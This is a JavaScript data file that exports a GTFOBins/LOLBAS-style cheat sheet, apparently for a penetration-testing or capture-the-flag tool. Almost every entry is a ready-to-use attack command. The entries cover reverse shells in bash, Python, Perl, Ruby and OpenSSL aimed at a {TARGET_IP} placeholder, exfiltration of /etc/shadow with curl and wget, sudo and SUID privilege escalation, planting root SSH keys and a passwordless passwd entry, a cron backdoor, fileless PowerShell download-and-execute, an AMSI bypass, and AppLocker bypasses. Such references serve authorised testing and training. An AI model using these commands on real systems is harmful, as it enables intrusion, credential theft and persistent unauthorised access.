export const GTFO = [
  // GTFOBins — Linux
  { name: "bash", os: "linux", type: "shell", desc: "Spawn shell or escalate via sudo/SUID",
    uses: [
      { label: "SUID shell", cmd: "bash -p" },
      { label: "Sudo shell", cmd: "sudo bash" },
      { label: "Reverse shell", cmd: "bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1" },
    ]
  },
  { name: "python3", os: "linux", type: "shell",  desc: "Shell, file read/write, reverse shell",
    uses: [
      { label: "Sudo shell", cmd: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"},
      { label: "SUID shell", cmd: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"},
      { label: "Reverse shell", cmd: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{TARGET_IP}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\""},
      { label: "File read", cmd: "python3 -c \"print(open('/etc/shadow').read())\""},
    ]
  },
  { name: "vim", os: "linux", type: "shell", desc: "Shell via :! command — common sudo misconfiguration",
    uses: [
      { label: "Sudo shell", cmd: "sudo vim -c ':!/bin/bash'" },
      { label: "SUID shell", cmd: "vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
      { label: "File read", cmd: "vim /etc/shadow" },
    ]
  },
  { name: "nano", os: "linux", type: "shell", desc: "Shell via ^R^X in sudo context",
    uses: [
      { label: "Sudo shell", cmd: "sudo nano\n# Then: Ctrl+R, Ctrl+X\n# Type: reset; sh 1>&0 2>&0" },
    ]
  },
  { name: "less", os: "linux", type: "shell", desc: "Shell via ! command inside less",
    uses: [
      { label: "Sudo shell", cmd: "sudo less /etc/passwd\n# Then type: !/bin/bash" },
      { label: "SUID shell", cmd: "less /etc/passwd\n# Then: !/bin/sh -p" },
    ]
  },
  { name: "find", os: "linux", type: "shell", desc: "Execute commands via -exec flag",
    uses: [
      { label: "SUID shell", cmd: "find . -exec /bin/sh -p \\; -quit" },
      { label: "Sudo shell", cmd: "sudo find . -exec /bin/bash \\; -quit" },
    ]
  },
  { name: "awk", os: "linux", type: "shell", desc: "Shell via system() call",
    uses: [
      { label: "Sudo shell", cmd: "sudo awk 'BEGIN {system(\"/bin/bash\")}'" },
      { label: "SUID shell", cmd: "awk 'BEGIN {system(\"/bin/sh -p\")}'" },
    ]
  },
  { name: "perl", os: "linux", type: "shell", desc: "Shell or reverse shell via exec",
    uses: [
      { label: "Sudo shell", cmd: "sudo perl -e 'exec \"/bin/bash\"'" },
      { label: "Reverse shell", cmd: "perl -e 'use Socket;$i=\"{TARGET_IP}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
    ]
  },
  { name: "ruby", os: "linux", type: "shell", desc: "Shell or reverse shell",
    uses: [
      { label: "Sudo shell", cmd: "sudo ruby -e 'exec \"/bin/bash\"'" },
      { label: "Reverse shell", cmd: "ruby -rsocket -e'f=TCPSocket.open(\"{TARGET_IP}\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    ]
  },
  { name: "nmap", os: "linux", type: "shell", desc: "Interactive mode shell (old nmap versions)",
    uses: [
      { label: "Sudo shell (old nmap)", cmd: "sudo nmap --interactive\n# Then: !sh" },
      { label: "Sudo shell (script)", cmd: "echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse" },
    ]
  },
  { name: "tar", os: "linux", type: "shell", desc: "Shell via checkpoint action",
    uses: [
      { label: "SUID/sudo shell", cmd: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash" },
      { label: "Wildcard injection (cron)", cmd: "echo '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=bash shell.sh'\ntar cf archive.tar *" },
    ]
  },
  { name: "wget", os: "linux", type: "file-read", desc: "Read files via --post-file or output",
    uses: [
      { label: "Exfil file via HTTP", cmd: "wget --post-file=/etc/shadow http://{TARGET_IP}:8080/" },
      { label: "Write file (sudo)", cmd: "sudo wget http://{TARGET_IP}:8080/authorized_keys -O /root/.ssh/authorized_keys" },
    ]
  },
  { name: "curl", os: "linux", type: "file-read", desc: "Read/write files, exfiltrate data",
    uses: [
      { label: "Read file", cmd: "curl file:///etc/shadow" },
      { label: "Exfil file", cmd: "curl -d @/etc/shadow http://{TARGET_IP}:8080/" },
      { label: "Write file (sudo)", cmd: "sudo curl http://{TARGET_IP}:8080/authorized_keys -o /root/.ssh/authorized_keys" },
    ]
  },
  { name: "cp", os: "linux", type: "file-write", desc: "Copy files — overwrite sensitive files",
    uses: [
      { label: "Overwrite /etc/passwd (sudo)", cmd: "sudo cp /tmp/passwd /etc/passwd" },
      { label: "Copy SUID bash", cmd: "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p" },
    ]
  },
  { name: "tee", os: "linux", type: "file-write", desc: "Write to files via stdin",
    uses: [
      { label: "Write to /etc/passwd (sudo)", cmd: "echo 'hacker::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd" },
      { label: "Write SSH key (sudo)", cmd: "cat /tmp/id_rsa.pub | sudo tee -a /root/.ssh/authorized_keys" },
    ]
  },
  { name: "dd", os: "linux", type: "file-write", desc: "Read/write raw data to files",
    uses: [
      { label: "Read file", cmd: "sudo dd if=/etc/shadow" },
      { label: "Write file", cmd: "echo 'data' | sudo dd of=/etc/cron.d/backdoor" },
    ]
  },
  { name: "openssl", os: "linux", type: "file-read", desc: "Read files, create reverse shell",
    uses: [
      { label: "Reverse shell (attacker)", cmd: "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444" },
      { label: "Reverse shell (target)", cmd: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {TARGET_IP}:4444 > /tmp/s" },
    ]
  },
  { name: "env", os: "linux", type: "shell", desc: "Execute commands via env",
    uses: [
      { label: "Sudo shell", cmd: "sudo env /bin/bash" },
      { label: "SUID shell", cmd: "env /bin/sh -p" },
    ]
  },
  // LOLBAS — Windows
  { name: "certutil", os: "windows", type: "file-transfer", desc: "Download files, encode/decode base64",
    uses: [
      { label: "Download file", cmd: "certutil -urlcache -split -f http://{TARGET_IP}:8080/shell.exe C:\\Temp\\shell.exe" },
      { label: "Base64 decode", cmd: "certutil -decode encoded.b64 shell.exe" },
      { label: "Base64 encode", cmd: "certutil -encode shell.exe encoded.b64" },
    ]
  },
  { name: "mshta", os: "windows", type: "execute", desc: "Execute HTA files — bypasses AppLocker",
    uses: [
      { label: "Remote HTA execution", cmd: "mshta http://{TARGET_IP}:8080/payload.hta" },
      { label: "Inline VBScript", cmd: "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd.exe\"\",0,True\")(window.close)" },
    ]
  },
  { name: "regsvr32", os: "windows", type: "execute", desc: "Execute DLL/SCT — bypasses AppLocker/whitelisting",
    uses: [
      { label: "Remote SCT execution", cmd: "regsvr32 /s /n /u /i:http://{TARGET_IP}:8080/payload.sct scrobj.dll" },
      { label: "Local DLL", cmd: "regsvr32 /s /u /i:payload.dll scrobj.dll" },
    ]
  },
  { name: "rundll32", os: "windows", type: "execute", desc: "Execute DLL functions",
    uses: [
      { label: "Execute DLL export", cmd: "rundll32 shell.dll,EntryPoint" },
      { label: "JavaScript via url.dll", cmd: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://{TARGET_IP}:8080/payload.sct\")" },
    ]
  },
  { name: "powershell", os: "windows", type: "execute", desc: "Download, execute, bypass — the Swiss army knife",
    uses: [
      { label: "Download & execute (fileless)", cmd: "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{TARGET_IP}:8080/shell.ps1')\"" },
      { label: "Base64 encoded command", cmd: "powershell -enc BASE64_PAYLOAD" },
      { label: "Bypass AMSI", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)" },
      { label: "Download file", cmd: "(New-Object Net.WebClient).DownloadFile('http://{TARGET_IP}:8080/file.exe','C:\\Temp\\file.exe')" },
    ]
  },
  { name: "wmic", os: "windows", type: "execute", desc: "Execute commands via WMI",
    uses: [
      { label: "Local command exec", cmd: "wmic process call create \"cmd.exe /c whoami > C:\\Temp\\out.txt\"" },
      { label: "Remote command exec", cmd: "wmic /node:{TARGET_IP} /user:{USERNAME} /password:{PASSWORD} process call create \"cmd.exe /c whoami\"" },
    ]
  },
  { name: "bitsadmin", os: "windows", type: "file-transfer", desc: "Download files via BITS service",
    uses: [
      { label: "Download file", cmd: "bitsadmin /transfer job /download /priority high http://{TARGET_IP}:8080/shell.exe C:\\Temp\\shell.exe" },
    ]
  },
  { name: "cmd", os: "windows", type: "execute", desc: "Various cmd.exe tricks",
    uses: [
      { label: "Run as different user", cmd: "runas /user:{USERNAME} cmd.exe" },
      { label: "Bypass restricted shell", cmd: "cmd /k" },
      { label: "Read file", cmd: "type C:\\Users\\Administrator\\Desktop\\root.txt" },
    ]
  },
]
